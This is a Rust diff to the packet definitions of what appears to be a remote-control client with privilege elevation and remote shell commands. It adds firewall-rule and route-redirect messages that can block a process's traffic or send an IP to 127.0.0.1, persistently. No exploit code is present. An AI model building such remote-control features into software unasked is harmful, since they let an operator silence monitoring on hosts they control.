@@ -88,10 +88,15 @@ pub enum ClientboundPacket {
     ManageSystem(String),
 
     GetProcessList,
+    GetProcessConnections(usize),
     KillProcess(Process),
     SuspendProcess(Process),
     ResumeProcess(Process),
     StartProcess(String),
+    AddFirewallRule(FirewallRule),
+    RemoveFirewallRule(FirewallRule),
+    AddRouteRedirect(RouteRedirect),
+    RemoveRouteRedirect(RouteRedirect),
 
     StartShell,
     ExitShell,
@@ -158,10 +163,15 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ElevateClient => "Elevate Client",
             ClientboundPacket::ManageSystem(_) => "Manage System",
             ClientboundPacket::GetProcessList => "Get Process List",
+            ClientboundPacket::GetProcessConnections(_) => "Get Process Connections",
             ClientboundPacket::KillProcess(_) => "Kill Process",
             ClientboundPacket::SuspendProcess(_) => "Suspend Process",
             ClientboundPacket::ResumeProcess(_) => "Resume Process",
             ClientboundPacket::StartProcess(_) => "Start Process",
+            ClientboundPacket::AddFirewallRule(_) => "Add Firewall Rule",
+            ClientboundPacket::RemoveFirewallRule(_) => "Remove Firewall Rule",
+            ClientboundPacket::AddRouteRedirect(_) => "Add Route Redirect",
+            ClientboundPacket::RemoveRouteRedirect(_) => "Remove Route Redirect",
             ClientboundPacket::StartShell => "Start Shell",
             ClientboundPacket::ExitShell => "Exit Shell",
             ClientboundPacket::ShellCommand(_) => "Shell Command",
@@ -247,6 +257,17 @@ pub struct ProcessList {
 pub struct Process {
     pub pid: usize,
     pub name: String,
+    pub network_connections: Option<Vec<NetworkConnection>>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct NetworkConnection {
+    pub local_address: String,
+    pub local_port: u16,
+    pub remote_address: String,
+    pub remote_port: u16,
+    pub state: String,
+    pub protocol: String,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
@@ -333,5 +354,35 @@ pub struct ModuleExecutionResult {
     pub output: String,       // Stdout/result
     pub error: String,        // Stderr/error
     pub exit_code: i32,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct FirewallRule {
+    pub process_name: String,
+    pub process_path: Option<String>,
+    pub rule_name: String,
+    pub direction: FirewallDirection, // Inbound or Outbound
+    pub action: FirewallAction,       // Block or Allow
+    pub remote_addresses: Option<Vec<String>>, // Optional specific IPs to block/allow
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum FirewallDirection {
+    Inbound,
+    Outbound,
+    Both,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum FirewallAction {
+    Block,
+    Allow,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct RouteRedirect {
+    pub target_address: String,    // IP to redirect
+    pub redirect_to: String,        // Invalid address to redirect to (e.g., "127.0.0.1" or "0.0.0.0")
+    pub permanent: bool,            // Whether to make persistent across reboots
 }
 
